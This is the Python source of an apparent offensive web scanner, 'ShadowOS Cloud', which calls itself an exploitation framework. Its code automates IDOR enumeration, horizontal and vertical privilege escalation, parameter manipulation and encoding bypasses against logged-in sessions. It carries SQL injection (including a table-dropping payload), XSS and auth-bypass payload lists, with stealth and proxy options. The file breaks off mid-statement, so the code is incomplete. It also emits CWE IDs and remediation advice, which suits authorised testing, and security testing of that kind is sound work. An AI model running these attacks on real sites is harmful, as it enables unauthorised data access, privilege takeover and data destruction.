#!/usr/bin/env python3
"""
ShadowOS Cloud v1.0 - Scanner Engine
Advanced Vulnerability Detection & Exploitation Framework

Developed by ShadowRock Team
"""

import asyncio
import aiohttp
import json
import logging
import random
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta
from enum import Enum
import base64
import hashlib
import itertools
from pathlib import Path
import yaml

class VulnerabilityType(Enum):
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    BUSINESS_LOGIC = "business_logic"
    RATE_LIMIT_BYPASS = "rate_limit_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    INFO_DISCLOSURE = "info_disclosure"
    INSECURE_DIRECT_OBJECT = "insecure_direct_object"
    API_ABUSE = "api_abuse"

class SeverityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class TestResult(Enum):
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    TIMEOUT = "timeout"
    ERROR = "error"
    RATE_LIMITED = "rate_limited"

@dataclass
class VulnerabilityFinding:
    vuln_type: VulnerabilityType
    severity: SeverityLevel
    title: str
    description: str
    url: str
    method: str
    parameters: Dict[str, str]
    payload: str
    evidence: Dict[str, Any]
    poc_steps: List[str]
    business_impact: str
    remediation: str
    confidence: float  # 0.0 to 1.0
    discovered_at: datetime
    cvss_score: Optional[float]
    cwe_id: Optional[str]

@dataclass
class ScanTarget:
    url: str
    method: str
    headers: Dict[str, str]
    parameters: Dict[str, str]
    auth_token: Optional[str]
    session_cookies: Dict[str, str]
    rate_limit: int  # requests per minute
    priority: int

@dataclass
class ScanConfiguration:
    target_domain: str
    scan_types: List[VulnerabilityType]
    intensity: str  # light, normal, aggressive
    max_concurrent: int
    timeout: int
    retry_count: int
    rate_limit_global: int
    stealth_mode: bool
    deep_scan: bool
    custom_payloads: Dict[str, List[str]]
    auth_config: Dict[str, Any]
    proxy_config: Optional[Dict[str, Any]]

class ShadowScannerEngine:
    """
    💥 Advanced Vulnerability Scanner Engine
    
    Features:
    - Multi-vector IDOR detection
    - Authentication bypass testing
    - Business logic flaw detection
    - Rate limit bypass techniques
    - Advanced payload generation
    - Context-aware scanning
    - Stealth evasion techniques
    """
    
    def __init__(self, config: ScanConfiguration, proxy_manager=None, intel_data=None):
        self.config = config
        self.proxy_manager = proxy_manager
        self.intel_data = intel_data or {}
        
        # Scanner state
        self.findings: List[VulnerabilityFinding] = []
        self.scan_targets: List[ScanTarget] = []
        self.session_data: Dict[str, Any] = {}
        self.rate_limiters: Dict[str, float] = {}
        
        # Payload libraries
        self.payloads = self.load_payload_libraries()
        
        # Statistics
        self.stats = {
            "requests_made": 0,
            "vulnerabilities_found": 0,
            "scan_start_time": None,
            "scan_end_time": None,
            "targets_scanned": 0,
            "false_positives_filtered": 0
        }
        
        self.setup_logging()
        
    def setup_logging(self):
        """Setup scanner logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [💥 SCANNER] %(levelname)s: %(message)s',
            handlers=[
                logging.FileHandler('shadowos_scanner.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def load_payload_libraries(self) -> Dict[str, List[str]]:
        """Load comprehensive payload libraries"""
        payloads = {
            "idor_numeric": [
                "1", "2", "3", "0", "-1", "999999", "000001",
                "2147483647", "-2147483648", "null", "undefined"
            ],
            
            "idor_uuid": [
                "00000000-0000-0000-0000-000000000000",
                "11111111-1111-1111-1111-111111111111",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                "{uuid}", "{user_id}", "{target_id}"
            ],
            
            "idor_encoding": [
                "{base64_encoded}", "{url_encoded}", "{hex_encoded}",
                "{jwt_manipulated}", "{encrypted_id}"
            ],
            
            "auth_bypass": [
                "admin", "administrator", "root", "system", "guest",
                "true", "false", "1", "0", "yes", "no",
                "'or'1'='1", "' OR 1=1--", "admin'--", "admin'/*"
            ],
            
            "sql_injection": [
                "'", "''", "'OR'1'='1", "'OR 1=1--", "'UNION SELECT NULL--",
                "1' OR '1'='1", "admin'--", "' OR 'a'='a", "1'/**/OR/**/1=1--",
                "'; DROP TABLE users--", "1 AND (SELECT SLEEP(5))--"
            ],
            
            "xss_basic": [
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "javascript:alert(1)", "<svg onload=alert(1)>",
                "<body onload=alert(1)>", "';alert(1);'", "\"><script>alert(1)</script>"
            ],
            
            "parameter_pollution": [
                "param=value1&param=value2", "param[]=value1&param[]=value2",
                "param.key=value", "param[key]=value", "param%5B%5D=value"
            ],
            
            "business_logic": [
                "-1", "0", "999999", "null", "undefined", "true", "false",
                "[]", "{}", '""', "NaN", "Infinity", "-Infinity"
            ]
        }
        
        # Add custom payloads from config
        if self.config.custom_payloads:
            for key, custom_list in self.config.custom_payloads.items():
                if key in payloads:
                    payloads[key].extend(custom_list)
                else:
                    payloads[key] = custom_list
                    
        return payloads
        
    async def initialize_scanner(self):
        """Initialize scanner with intel data and authentication"""
        self.logger.info("🔧 Initializing ShadowOS Scanner Engine...")
        
        # Load targets from intel data
        if self.intel_data:
            await self.load_targets_from_intel()
            
        # Setup authentication
        await self.setup_authentication()
        
        # Initialize session management
        await self.initialize_sessions()
        
        # Validate proxy connectivity
        if self.proxy_manager:
            await self.validate_proxy_connectivity()
            
        self.logger.info(f"✅ Scanner initialized with {len(self.scan_targets)} targets")
        
    async def load_targets_from_intel(self):
        """Load scan targets from intelligence data"""
        endpoints = self.intel_data.get("endpoints", [])
        subdomains = self.intel_data.get("subdomains", [])
        
        # Add discovered endpoints
        for endpoint in endpoints:
            target = ScanTarget(
                url=endpoint.get("url"),
                method=endpoint.get("method", "GET"),
                headers=endpoint.get("headers", {}),
                parameters=endpoint.get("parameters", {}),
                auth_token=None,
                session_cookies={},
                rate_limit=endpoint.get("rate_limit", 60),
                priority=endpoint.get("priority", 5)
            )
            self.scan_targets.append(target)
            
        # Add subdomain endpoints
        for subdomain in subdomains:
            common_paths = [
                "/api/v1/user/profile", "/api/user/{id}", "/admin/users/{id}",
                "/dashboard/user/{id}", "/account/profile", "/user/settings",
                "/api/orders/{id}", "/admin/orders", "/profile/edit"
            ]
            
            for path in common_paths:
                target = ScanTarget(
                    url=f"https://{subdomain}{path}",
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                    parameters={},
                    auth_token=None,
                    session_cookies={},
                    rate_limit=30,
                    priority=3
                )
                self.scan_targets.append(target)
                
    async def setup_authentication(self):
        """Setup authentication for scanning"""
        auth_config = self.config.auth_config
        
        if not auth_config:
            self.logger.warning("⚠️ No authentication configured - limited scan scope")
            return
            
        # Handle different auth types
        auth_type = auth_config.get("type", "none")
        
        if auth_type == "jwt":
            await self.setup_jwt_auth(auth_config)
        elif auth_type == "session":
            await self.setup_session_auth(auth_config)
        elif auth_type == "api_key":
            await self.setup_api_key_auth(auth_config)
        elif auth_type == "oauth":
            await self.setup_oauth_auth(auth_config)
            
        self.logger.info(f"🔐 Authentication setup completed: {auth_type}")
        
    async def setup_jwt_auth(self, auth_config: Dict[str, Any]):
        """Setup JWT-based authentication"""
        token = auth_config.get("token")
        
        if token:
            # Add JWT to all targets
            for target in self.scan_targets:
                target.auth_token = token
                target.headers["Authorization"] = f"Bearer {token}"
                
        # Setup JWT manipulation techniques
        if token:
            self.session_data["jwt_token"] = token
            self.session_data["jwt_payloads"] = self.generate_jwt_attack_payloads(token)
            
    async def setup_session_auth(self, auth_config: Dict[str, Any]):
        """Setup session-based authentication"""
        login_url = auth_config.get("login_url")
        username = auth_config.get("username")
        password = auth_config.get("password")
        
        if login_url and username and password:
            # Perform login
            session_cookies = await self.perform_login(login_url, username, password)
            
            if session_cookies:
                # Add session cookies to all targets
                for target in self.scan_targets:
                    target.session_cookies.update(session_cookies)
                    
                self.session_data["session_cookies"] = session_cookies
                self.logger.info("✅ Session authentication successful")
            else:
                self.logger.error("❌ Session authentication failed")
                
    async def setup_api_key_auth(self, auth_config: Dict[str, Any]):
        """Setup API key authentication"""
        api_key = auth_config.get("api_key")
        header_name = auth_config.get("header_name", "X-API-Key")
        
        if api_key:
            for target in self.scan_targets:
                target.headers[header_name] = api_key
                
    async def perform_login(self, login_url: str, username: str, password: str) -> Dict[str, str]:
        """Perform login and extract session cookies"""
        try:
            async with aiohttp.ClientSession() as session:
                # First, get login form
                async with session.get(login_url) as response:
                    login_page = await response.text()
                    
                # Extract CSRF token if present
                csrf_token = self.extract_csrf_token(login_page)
                
                # Prepare login data
                login_data = {
                    "username": username,
                    "password": password
                }
                
                if csrf_token:
                    login_data["csrf_token"] = csrf_token
                    
                # Perform login
                async with session.post(login_url, data=login_data) as response:
                    if response.status in [200, 302]:  # Success or redirect
                        # Extract session cookies
                        cookies = {}
                        for cookie in session.cookie_jar:
                            cookies[cookie.key] = cookie.value
                            
                        return cookies
                        
        except Exception as e:
            self.logger.error(f"❌ Login failed: {str(e)}")
            
        return {}
        
    def extract_csrf_token(self, html: str) -> Optional[str]:
        """Extract CSRF token from HTML"""
        patterns = [
            r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
                
        return None
        
    async def initialize_sessions(self):
        """Initialize session management"""
        # Create multiple sessions for different user contexts
        self.session_data["user_sessions"] = {}
        
        # If we have multiple user credentials, create sessions for each
        auth_config = self.config.auth_config
        
        if auth_config and auth_config.get("multiple_users"):
            users = auth_config["multiple_users"]
            
            for user_id, user_data in users.items():
                session_cookies = await self.perform_login(
                    user_data["login_url"],
                    user_data["username"],
                    user_data["password"]
                )
                
                if session_cookies:
                    self.session_data["user_sessions"][user_id] = {
                        "cookies": session_cookies,
                        "user_data": user_data
                    }
                    
        self.logger.info(f"🔧 Initialized {len(self.session_data.get('user_sessions', {}))} user sessions")
        
    async def validate_proxy_connectivity(self):
        """Validate proxy manager connectivity"""
        if not self.proxy_manager:
            return
            
        try:
            # Test proxy with a simple request
            test_url = "https://httpbin.org/ip"
            status, content, headers = await self.proxy_manager.make_request(test_url)
            
            if status == 200:
                self.logger.info("✅ Proxy connectivity validated")
            else:
                self.logger.warning(f"⚠️ Proxy test returned status: {status}")
                
        except Exception as e:
            self.logger.error(f"❌ Proxy validation failed: {str(e)}")
            
    async def scan_vulnerabilities(self) -> List[VulnerabilityFinding]:
        """Main vulnerability scanning orchestrator"""
        self.logger.info("🚀 Starting comprehensive vulnerability scan...")
        self.stats["scan_start_time"] = datetime.now()
        
        # Initialize scanner
        await self.initialize_scanner()
        
        # Create scanning tasks based on configuration
        scanning_tasks = []
        
        for vuln_type in self.config.scan_types:
            if vuln_type == VulnerabilityType.IDOR:
                scanning_tasks.append(self.scan_idor_vulnerabilities())
            elif vuln_type == VulnerabilityType.AUTH_BYPASS:
                scanning_tasks.append(self.scan_auth_bypass())
            elif vuln_type == VulnerabilityType.BUSINESS_LOGIC:
                scanning_tasks.append(self.scan_business_logic_flaws())
            elif vuln_type == VulnerabilityType.RATE_LIMIT_BYPASS:
                scanning_tasks.append(self.scan_rate_limit_bypass())
            elif vuln_type == VulnerabilityType.PRIVILEGE_ESCALATION:
                scanning_tasks.append(self.scan_privilege_escalation())
            elif vuln_type == VulnerabilityType.INFO_DISCLOSURE:
                scanning_tasks.append(self.scan_info_disclosure())
            elif vuln_type == VulnerabilityType.API_ABUSE:
                scanning_tasks.append(self.scan_api_abuse())
                
        # Execute scanning tasks with concurrency control
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        
        async def run_scan_with_semaphore(scan_coro):
            async with semaphore:
                return await scan_coro
                
        # Run all scans
        results = await asyncio.gather(
            *[run_scan_with_semaphore(task) for task in scanning_tasks],
            return_exceptions=True
        )
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                self.logger.error(f"❌ Scan task failed: {str(result)}")
            elif isinstance(result, list):
                self.findings.extend(result)
                
        # Post-processing
        await self.post_process_findings()
        
        self.stats["scan_end_time"] = datetime.now()
        self.stats["vulnerabilities_found"] = len(self.findings)
        
        self.logger.info(f"✅ Scan completed: {len(self.findings)} vulnerabilities found")
        
        return self.findings
        
    async def scan_idor_vulnerabilities(self) -> List[VulnerabilityFinding]:
        """Comprehensive IDOR vulnerability scanning"""
        self.logger.info("🔍 Scanning for IDOR vulnerabilities...")
        findings = []
        
        # Different IDOR detection strategies
        strategies = [
            self.idor_horizontal_privilege_escalation,
            self.idor_vertical_privilege_escalation,
            self.idor_batch_enumeration,
            self.idor_parameter_manipulation,
            self.idor_encoding_bypass
        ]
        
        for strategy in strategies:
            try:
                strategy_findings = await strategy()
                findings.extend(strategy_findings)
            except Exception as e:
                self.logger.error(f"❌ IDOR strategy failed: {str(e)}")
                
        return findings
        
    async def idor_horizontal_privilege_escalation(self) -> List[VulnerabilityFinding]:
        """Test for horizontal privilege escalation via IDOR"""
        findings = []
        
        # Need at least 2 user sessions for horizontal testing
        user_sessions = self.session_data.get("user_sessions", {})
        
        if len(user_sessions) < 2:
            self.logger.warning("⚠️ Need multiple user sessions for horizontal IDOR testing")
            return findings
            
        user_ids = list(user_sessions.keys())
        
        for target in self.scan_targets:
            # Skip if target doesn't look like user-specific endpoint
            if not self.is_user_specific_endpoint(target.url):
                continue
                
            for i in range(len(user_ids)):
                for j in range(len(user_ids)):
                    if i == j:
                        continue
                        
                    user_a = user_ids[i]
                    user_b = user_ids[j]
                    
                    # Try to access user B's data using user A's session
                    finding = await self.test_horizontal_idor(target, user_a, user_b)
                    if finding:
                        findings.append(finding)
                        
        return findings
        
    async def test_horizontal_idor(self, target: ScanTarget, attacker_user: str, victim_user: str) -> Optional[VulnerabilityFinding]:
        """Test specific horizontal IDOR scenario"""
        try:
            # Get attacker's session
            attacker_session = self.session_data["user_sessions"][attacker_user]
            victim_session = self.session_data["user_sessions"][victim_user]
            
            # First, make legitimate request as victim to get their data
            victim_response = await self.make_authenticated_request(
                target, victim_session["cookies"]
            )
            
            if victim_response["status"] != 200:
                return None
                
            victim_data = victim_response["content"]
            
            # Extract victim's ID patterns from URL or response
            victim_identifiers = self.extract_user_identifiers(target.url, victim_data)
            
            # Now try to access victim's data using attacker's session
            for identifier in victim_identifiers:
                modified_target = self.modify_target_with_identifier(target, identifier)
                
                attacker_response = await self.make_authenticated_request(
                    modified_target, attacker_session["cookies"]
                )
                
                # Check if attacker got victim's data
                if self.is_unauthorized_access(victim_data, attacker_response["content"]):
                    return VulnerabilityFinding(
                        vuln_type=VulnerabilityType.IDOR,
                        severity=SeverityLevel.HIGH,
                        title="Horizontal Privilege Escalation via IDOR",
                        description=f"User {attacker_user} can access {victim_user}'s data",
                        url=modified_target.url,
                        method=modified_target.method,
                        parameters=modified_target.parameters,
                        payload=str(identifier),
                        evidence={
                            "attacker_user": attacker_user,
                            "victim_user": victim_user,
                            "victim_data_sample": victim_data[:500],
                            "attacker_response": attacker_response["content"][:500]
                        },
                        poc_steps=[
                            f"1. Login as {victim_user}",
                            f"2. Access {target.url} and note the data",
                            f"3. Login as {attacker_user}",
                            f"4. Access {modified_target.url}",
                            f"5. Observe unauthorized access to {victim_user}'s data"
                        ],
                        business_impact="Attackers can access other users' private data, leading to privacy violations and potential data breaches",
                        remediation="Implement proper authorization checks to ensure users can only access their own resources",
                        confidence=0.9,
                        discovered_at=datetime.now(),
                        cvss_score=7.5,
                        cwe_id="CWE-639"
                    )
                    
        except Exception as e:
            self.logger.error(f"❌ Horizontal IDOR test failed: {str(e)}")
            
        return None
        
    def is_user_specific_endpoint(self, url: str) -> bool:
        """Check if endpoint appears to be user-specific"""
        user_patterns = [
            r"/user/\d+", r"/users/\d+", r"/profile/\d+", r"/account/\d+",
            r"/api/v\d+/user/\d+", r"/dashboard/user/\d+", r"/admin/users/\d+",
            r"/user/[a-f0-9-]{36}", r"/profile/[a-f0-9-]{36}"  # UUID patterns
        ]
        
        for pattern in user_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                return True
                
        return False
        
    def extract_user_identifiers(self, url: str, response_data: str) -> List[str]:
        """Extract user identifiers from URL and response data"""
        identifiers = []
        
        # Extract from URL
        id_patterns = [
            r"/(\d+)(?:/|$)",  # Numeric IDs
            r"/([a-f0-9-]{36})(?:/|$)",  # UUIDs
            r"[?&]id=(\d+)",  # Query parameter IDs
            r"[?&]user_id=(\d+)",
            r"[?&]user=([^&]+)"
        ]
        
        for pattern in id_patterns:
            matches = re.findall(pattern, url, re.IGNORECASE)
            identifiers.extend(matches)
            
        # Extract from response JSON
        try:
            if response_data.strip().startswith('{'):
                data = json.loads(response_data)
                self.extract_ids_from_json(data, identifiers)
        except:
            pass
            
        # Extract from response text
        text_patterns = [
            r'"id"\s*:\s*(\d+)',
            r'"user_id"\s*:\s*(\d+)',
            r'"uuid"\s*:\s*"([a-f0-9-]{36})"'
        ]
        
        for pattern in text_patterns:
            matches = re.findall(pattern, response_data, re.IGNORECASE)
            identifiers.extend(matches)
            
        return list(set(identifiers))  # Remove duplicates
        
    def extract_ids_from_json(self, data: Any, identifiers: List[str]):
        """Recursively extract IDs from JSON data"""
        if isinstance(data, dict):
            for key, value in data.items():
                if key.lower() in ['id', 'user_id', 'uuid', 'user_uuid'] and value:
                    identifiers.append(str(value))
                elif isinstance(value, (dict, list)):
                    self.extract_ids_from_json(value, identifiers)
        elif isinstance(data, list):
            for item in data:
                self.extract_ids_from_json(item, identifiers)
                
    def modify_target_with_identifier(self, target: ScanTarget, identifier: str) -> ScanTarget:
        """Modify target URL/parameters with new identifier"""
        modified_target = ScanTarget(
            url=target.url,
            method=target.method,
            headers=target.headers.copy(),
            parameters=target.parameters.copy(),
            auth_token=target.auth_token,
            session_cookies=target.session_cookies.copy(),
            rate_limit=target.rate_limit,
            priority=target.priority
        )
        
        # Replace in URL path
        modified_target.url = re.sub(r'/\d+(?=/|$)', f'/{identifier}', modified_target.url)
        modified_target.url = re.sub(r'/[a-f0-9-]{36}(?=/|$)', f'/{identifier}', modified_target.url)
        
        # Replace in query parameters
        for param in ['id', 'user_id', 'user']:
            if param in modified_target.parameters:
                modified_target.parameters[param] = identifier
                
        return modified_target
        
    def is_unauthorized_access(self, legitimate_data: str, test_response: str) -> bool:
        """Check if test response contains unauthorized data"""
        if not test_response or len(test_response) < 50:
            return False
            
        # Simple similarity check - in production, this would be more sophisticated
        similarity = self.calculate_similarity(legitimate_data, test_response)
        
        # If responses are very similar (>70%), likely unauthorized access
        if similarity > 0.7:
            return True
            
        # Check for specific data patterns that shouldn't be accessible
        sensitive_patterns = [
            r'email.*@.*\.com', r'phone.*\d{10}', r'ssn.*\d{3}-\d{2}-\d{4}',
            r'address.*\d+.*street', r'credit.*card.*\d{4}'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, test_response, re.IGNORECASE):
                return True
                
        return False
        
    def calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity between two text strings"""
        # Simple Jaccard similarity
        set1 = set(text1.lower().split())
        set2 = set(text2.lower().split())
        
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        
        return intersection / union if union > 0 else 0.0
        
    async def idor_vertical_privilege_escalation(self) -> List[VulnerabilityFinding]:
        """Test for vertical privilege escalation (user -> admin)"""
        findings = []
        
        # Admin endpoints to test
        admin_endpoints = [
            "/admin/users", "/admin/dashboard", "/admin/settings",
            "/api/admin/users", "/api/v1/admin/statistics",
            "/management/users", "/system/config"
        ]
        
        user_sessions = self.session_data.get("user_sessions", {})
        
        for user_id, session_data in user_sessions.items():
            # Skip if this is already an admin session
            if session_data.get("user_data", {}).get("role") == "admin":
                continue
                
            for endpoint in admin_endpoints:
                full_url = f"https://{self.config.target_domain}{endpoint}"
                
                target = ScanTarget(
                    url=full_url,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                    parameters={},
                    auth_token=None,
                    session_cookies=session_data["cookies"],
                    rate_limit=30,
                    priority=5
                )
                
                response = await self.make_authenticated_request(target, session_data["cookies"])
                
                # Check if regular user got admin access
                if self.is_admin_access_granted(response):
                    finding = VulnerabilityFinding(
                        vuln_type=VulnerabilityType.IDOR,
                        severity=SeverityLevel.CRITICAL,
                        title="Vertical Privilege Escalation to Admin",
                        description=f"Regular user {user_id} can access admin functionality",
                        url=full_url,
                        method="GET",
                        parameters={},
                        payload=endpoint,
                        evidence={
                            "user_id": user_id,
                            "admin_endpoint": endpoint,
                            "response_status": response["status"],
                            "response_sample": response["content"][:500],
                            "admin_indicators": self.extract_admin_indicators(response["content"])
                        },
                        poc_steps=[
                            f"1. Login as regular user: {user_id}",
                            f"2. Navigate to admin endpoint: {full_url}",
                            f"3. Observe unauthorized admin access granted",
                            "4. Exploit admin functionality"
                        ],
                        business_impact="Regular users can gain administrative privileges, potentially compromising entire system security",
                        remediation="Implement role-based access control (RBAC) with proper authorization checks",
                        confidence=0.95,
                        discovered_at=datetime.now(),
                        cvss_score=9.0,
                        cwe_id="CWE-269"
                    )
                    findings.append(finding)
                    
        return findings
        
    def is_admin_access_granted(self, response: Dict[str, Any]) -> bool:
        """Check if response indicates admin access was granted"""
        if response["status"] != 200:
            return False
            
        content = response["content"].lower()
        
        # Admin access indicators
        admin_indicators = [
            "admin dashboard", "user management", "system settings",
            "admin panel", "administrative", "manage users",
            "system configuration", "admin privileges"
        ]
        
        for indicator in admin_indicators:
            if indicator in content:
                return True
                
        # Check for admin-specific functionality
        admin_functions = [
            "delete user", "create admin", "system logs",
            "database access", "server config", "user roles"
        ]
        
        for function in admin_functions:
            if function in content:
                return True
                
        return False
        
    def extract_admin_indicators(self, content: str) -> List[str]:
        """Extract indicators that suggest admin access"""
        indicators = []
        content_lower = content.lower()
        
        admin_keywords = [
            "admin dashboard", "user management", "system settings",
            "admin panel", "delete user", "create admin",
            "system logs", "server config", "database"
        ]
        
        for keyword in admin_keywords:
            if keyword in content_lower:
                indicators.append(keyword)
                
        return indicators
        
    async def idor_batch_enumeration(self) -> List[VulnerabilityFinding]:
        """Perform batch enumeration to find accessible resources"""
        findings = []
        
        # Common ID ranges for enumeration
        id_ranges = [
            range(1, 100),      # Small range
            range(1000, 1050),  # Mid range
            range(10000, 10020) # Large range
        ]
        
        # UUID enumeration (common UUIDs)
        common_uuids = [
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
        ]
        
        for target in self.scan_targets:
            if not self.is_enumerable_endpoint(target.url):
                continue
                
            # Test numeric enumeration
            accessible_ids = []
            
            for id_range in id_ranges:
                for test_id in id_range:
                    modified_target = self.modify_target_with_identifier(target, str(test_id))
                    
                    try:
                        response = await self.make_authenticated_request(
                            modified_target, target.session_cookies
                        )
                        
                        if response["status"] == 200 and len(response["content"]) > 100:
                            accessible_ids.append(test_id)
                            
                        # Rate limiting
                        await asyncio.sleep(1.0 / target.rate_limit * 60)
                        
                    except Exception as e:
                        self.logger.debug(f"Enumeration error for ID {test_id}: {str(e)}")
                        
                    if len(accessible_ids) > 10:  # Found enough evidence
                        break
                        
                if len(accessible_ids) > 10:
                    break
                    
            # If we found many accessible IDs, it's likely an IDOR
            if len(accessible_ids) > 5:
                finding = VulnerabilityFinding(
                    vuln_type=VulnerabilityType.IDOR,
                    severity=SeverityLevel.HIGH,
                    title="Insecure Direct Object Reference via ID Enumeration",
                    description=f"Endpoint allows enumeration of {len(accessible_ids)} different resources",
                    url=target.url,
                    method=target.method,
                    parameters=target.parameters,
                    payload=f"IDs: {accessible_ids[:10]}",
                    evidence={
                        "accessible_ids": accessible_ids,
                        "total_found": len(accessible_ids),
                        "sample_responses": []  # Could add sample responses
                    },
                    poc_steps=[
                        "1. Identify endpoint with ID parameter",
                        "2. Enumerate sequential IDs (1, 2, 3, ...)",
                        f"3. Found {len(accessible_ids)} accessible resources",
                        "4. Access unauthorized data"
                    ],
                    business_impact="Attackers can enumerate and access multiple user resources systematically",
                    remediation="Implement authorization checks and consider using non-sequential identifiers",
                    confidence=0.8,
                    discovered_at=datetime.now(),
                    cvss_score=6.5,
                    cwe_id="CWE-639"
                )
                findings.append(finding)
                
        return findings
        
    def is_enumerable_endpoint(self, url: str) -> bool:
        """Check if endpoint is suitable for enumeration"""
        enumerable_patterns = [
            r"/\d+(?:/|$)",           # Ends with numeric ID
            r"[?&]id=\d+",           # Has ID parameter
            r"/user/\d+",            # User endpoint
            r"/order/\d+",           # Order endpoint
            r"/document/\d+",        # Document endpoint
            r"/api/.*/\d+",          # API with numeric ID
        ]
        
        for pattern in enumerable_patterns:
            if re.search(pattern, url):
                return True
                
        return False
        
    async def idor_parameter_manipulation(self) -> List[VulnerabilityFinding]:
        """Test parameter manipulation techniques"""
        findings = []
        
        manipulation_techniques = [
            # Parameter pollution
            {"type": "pollution", "transform": lambda p, v: {p: [v, "admin"]}},
            
            # Type confusion
            {"type": "type_confusion", "transform": lambda p, v: {p: {"$ne": None}}},
            
            # Array injection
            {"type": "array_injection", "transform": lambda p, v: {f"{p}[]": v}},
            
            # JSON injection
            {"type": "json_injection", "transform": lambda p, v: {p: '{"admin": true}'}},
            
            # Wildcard injection
            {"type": "wildcard", "transform": lambda p, v: {p: "*"}},
        ]
        
        for target in self.scan_targets:
            if not target.parameters:
                continue
                
            for param_name, param_value in target.parameters.items():
                for technique in manipulation_techniques:
                    try:
                        # Apply transformation
                        modified_params = technique["transform"](param_name, param_value)
                        
                        modified_target = ScanTarget(
                            url=target.url,
                            method=target.method,
                            headers=target.headers.copy(),
                            parameters=modified_params,
                            auth_token=target.auth_token,
                            session_cookies=target.session_cookies.copy(),
                            rate_limit=target.rate_limit,
                            priority=target.priority
                        )
                        
                        response = await self.make_authenticated_request(
                            modified_target, target.session_cookies
                        )
                        
                        # Check if manipulation resulted in unauthorized access
                        if self.is_parameter_manipulation_successful(response, technique["type"]):
                            finding = VulnerabilityFinding(
                                vuln_type=VulnerabilityType.IDOR,
                                severity=SeverityLevel.MEDIUM,
                                title=f"IDOR via Parameter {technique['type'].title()}",
                                description=f"Parameter manipulation using {technique['type']} technique bypasses authorization",
                                url=target.url,
                                method=target.method,
                                parameters=modified_params,
                                payload=str(modified_params),
                                evidence={
                                    "technique": technique["type"],
                                    "original_param": {param_name: param_value},
                                    "modified_param": modified_params,
                                    "response_status": response["status"],
                                    "response_sample": response["content"][:300]
                                },
                                poc_steps=[
                                    f"1. Identify parameter: {param_name}",
                                    f"2. Apply {technique['type']} technique",
                                    f"3. Modified parameter: {modified_params}",
                                    "4. Observe unauthorized access"
                                ],
                                business_impact="Parameter manipulation can bypass authorization controls",
                                remediation="Implement strict parameter validation and type checking",
                                confidence=0.7,
                                discovered_at=datetime.now(),
                                cvss_score=5.5,
                                cwe_id="CWE-639"
                            )
                            findings.append(finding)
                            
                    except Exception as e:
                        self.logger.debug(f"Parameter manipulation error: {str(e)}")
                        
        return findings
        
    def is_parameter_manipulation_successful(self, response: Dict[str, Any], technique: str) -> bool:
        """Check if parameter manipulation was successful"""
        if response["status"] not in [200, 201]:
            return False
            
        content = response["content"].lower()
        
        # Success indicators based on technique
        success_indicators = {
            "pollution": ["admin", "privileged", "elevated"],
            "type_confusion": ["all users", "multiple records", "array"],
            "array_injection": ["array", "multiple", "collection"],
            "json_injection": ["admin", "role", "privilege"],
            "wildcard": ["multiple", "all", "wildcard"]
        }
        
        indicators = success_indicators.get(technique, [])
        
        for indicator in indicators:
            if indicator in content:
                return True
                
        return False
        
    async def idor_encoding_bypass(self) -> List[VulnerabilityFinding]:
        """Test encoding bypass techniques"""
        findings = []
        
        encoding_techniques = [
            {"name": "base64", "encode": lambda x: base64.b64encode(x.encode()).decode()},
            {"name": "url", "encode": lambda x: urllib.parse.quote(x)},
            {"name": "double_url", "encode": lambda x: urllib.parse.quote(urllib.parse.quote(x))},
            {"name": "hex", "encode": lambda x: x.encode().hex()},
            {"name": "unicode", "encode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)},
        ]
        
        for target in self.scan_targets:
            # Extract IDs from URL and parameters
            ids_to_test = self.extract_user_identifiers(target.url, "")
            
            for original_id in ids_to_test:
                for technique in encoding_techniques:
                    try:
                        encoded_id = technique["encode"](original_id)
                        
                        modified_target = self.modify_target_with_identifier(target, encoded_id)
                        
                        response = await self.make_authenticated_request(
                            modified_target, target.session_cookies
                        )
                        
                        if self.is_encoding_bypass_successful(response):
                            finding = VulnerabilityFinding(
                                vuln_type=VulnerabilityType.IDOR,
                                severity=SeverityLevel.MEDIUM,
                                title=f"IDOR via {technique['name'].title()} Encoding Bypass",
                                description=f"Authorization bypass using {technique['name']} encoding",
                                url=modified_target.url,
                                method=modified_target.method,
                                parameters=modified_target.parameters,
                                payload=f"{original_id} -> {encoded_id}",
                                evidence={
                                    "encoding_technique": technique["name"],
                                    "original_id": original_id,
                                    "encoded_id": encoded_id,
                                    "response_status": response["status"]
                                },
                                poc_steps=[
                                    f"1. Identify ID parameter: {original_id}",
                                    f"2. Encode using {technique['name']}: {encoded_id}",
                                    f"3. Access URL: {modified_target.url}",
                                    "4. Observe authorization bypass"
                                ],
                                business_impact="Encoding-based bypass can circumvent access controls",
                                remediation="Implement proper input validation and decoding before authorization checks",
                                confidence=0.75,
                                discovered_at=datetime.now(),
                                cvss_score=5.0,
